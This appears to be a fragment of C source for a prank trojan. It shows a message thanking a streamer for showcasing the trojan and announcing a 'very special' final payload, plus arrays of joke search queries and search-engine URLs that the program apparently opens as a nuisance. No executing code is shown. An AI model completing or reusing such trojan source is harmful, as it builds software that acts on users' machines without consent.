...
const unsigned char msg[] = "Thanks Koe for showing my trojan on stream!\r\n\r\nPlease wait some time until the last payload activates, which is a very special one.";

char *sites[] = {
	"http://google.co.uk/search?q=hip+music",
	"%1cortana+is+the+new+ukriaia",
	"%1animated+christmas+tree+for+desktop",
	"%1mp3+midi+converter",
	"%1no+download",
	"%1how+to+get+sonic+mania+in+2019",
	"%1preventon+antivirus+download",
	"%1nyan+cat+mp3+download",
	"%1is+ukriaia+a+virus",
	"%1no+no+no+no",
	"%1dog+desktop",
	"%1yourcoelum+download",
	"%1cool+toolbars",
	"http://www.youtube.com/results?search_query=seempseens",
	"http://google.co.uk/search?q=thicc",
	"%1grand+ma+rom+download",
	"%1ukriaia+download+free",
	"%1free+midi+download",
	"http://google.co.uk/search?q=no+ants",
	"http://google.co.uk/search?q=less+smiling",
	"%1smash+mouth+all+star+midi",
	"%1stinky+smokey+marchmarchs",
	"%1joel+keena+midi+legit+not+converted",
	"%1skrillex+scay+onster+an+nice+sprites+midi",
	"%1stone+halation+midi",
	"https://dreamfiction.fandom.com/wiki/the%20kitty%20is%20my%20limit?veaction=edit",
};

char *engines[] = {
	"http://google.co.uk/search?q=",
	"http://ask.com/web?q=",
	"http://wiki.com/search?q=",
